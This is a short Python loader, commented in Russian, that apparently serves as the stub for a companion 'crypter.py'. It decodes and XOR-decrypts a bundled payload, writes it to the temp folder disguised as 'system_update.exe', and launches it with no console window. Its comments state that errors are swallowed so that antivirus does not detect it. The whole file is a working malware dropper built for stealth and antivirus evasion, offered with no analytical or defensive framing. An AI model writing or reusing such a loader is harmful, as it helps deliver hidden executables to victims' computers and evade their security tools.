import base64
import os
import sys
import tempfile
import subprocess

# Ключ для расшифровки (должен совпадать с crypter.py)
KEY = 0xAA

def main():
    try:
        # 1. Определяем, откуда запущен скрипт (из папки или из вшитого exe)
        if getattr(sys, 'frozen', False):
            # Если запущен как скомпилированный .exe
            base_path = sys._MEIPASS
        else:
            # Если запущен как обычный скрипт .py
            base_path = os.path.dirname(os.path.abspath(__file__))

        # Путь к зашифрованному файлу
        payload_path = os.path.join(base_path, "payload.txt")

        # 2. Читаем зашифрованный файл
        if not os.path.exists(payload_path):
            return # Если файла нет, тихо выходим

        with open(payload_path, "rb") as f:
            encrypted_data = base64.b64decode(f.read())

        # 3. Расшифровываем
        decrypted = bytes([b ^ KEY for b in encrypted_data])

        # 4. Сохраняем во временную папку
        temp_dir = tempfile.gettempdir()
        exe_path = os.path.join(temp_dir, "system_update.exe")

        with open(exe_path, "wb") as f:
            f.write(decrypted)

        # 5. Запускаем без окна консоли
        # CREATE_NO_WINDOW = 0x08000000
        subprocess.Popen([exe_path], creationflags=0x08000000)

    except Exception:
        # Если что-то пошло не так — молчим, чтобы антивирус не спалил
        pass

if __name__ == "__main__":
    main()
